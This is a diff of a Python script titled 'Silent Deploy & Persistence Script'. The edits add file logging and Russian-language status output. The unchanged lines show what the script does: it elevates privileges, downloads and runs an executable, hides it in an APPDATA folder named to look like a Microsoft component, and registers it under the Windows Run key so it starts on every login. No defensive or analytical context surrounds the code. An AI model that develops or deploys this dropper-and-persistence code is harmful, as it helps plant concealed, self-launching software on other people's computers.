@@ -7,6 +7,7 @@ import urllib.request
 import ctypes
 import winreg
 from pathlib import Path
+from datetime import datetime
 
 # ============================================================
 #  Silent Deploy & Persistence Script
@@ -21,11 +22,18 @@ HIDDEN_DIR = Path(os.getenv("APPDATA")) / "Microsoft" / "CLR"
 HIDDEN_FILE = HIDDEN_DIR / f"{APP_NAME}.exe"
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
+# --- Log file next to script ---
+SCRIPT_DIR = Path(sys.argv[0]).resolve().parent
+LOG_FILE = SCRIPT_DIR / f"deploy_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+
 # --- Logging Setup ---
 logging.basicConfig(
     level=logging.INFO,
     format="%(message)s",
-    handlers=[logging.StreamHandler(sys.stdout)]
+    handlers=[
+        logging.FileHandler(LOG_FILE, encoding="utf-8"),
+        logging.StreamHandler(sys.stdout)
+    ]
 )
 log = logging.getLogger("deploy")
 
@@ -89,6 +97,9 @@ def add_to_startup(dest: Path) -> tuple[bool, str]:
 
 # --- Main ---
 if __name__ == "__main__":
+    log.info(f"=== Деплой начат: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')} ===")
+    log.info(f"Лог-файл: {LOG_FILE}\n")
+
     elevate()
 
     results = {"download": None, "execute": None, "startup": None}
@@ -109,7 +120,7 @@ if __name__ == "__main__":
     results["startup"] = (ok3, reason3)
 
     # --- Output ---
-    print("\n" + "=" * 50)
+    log.info("=" * 50)
     for action, label in [
         ("download",   "Скачивание"),
         ("execute",    "Запуск"),
@@ -117,5 +128,6 @@ if __name__ == "__main__":
     ]:
         success, msg = results[action]
         status = "Успешно" if success else "Провал"
-        print(f"{label}: {status} | Причина: {msg}")
-    print("=" * 50)
+        log.info(f"{label}: {status} | Причина: {msg}")
+    log.info("=" * 50)
+    log.info(f"\n=== Завершено: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')} ===")
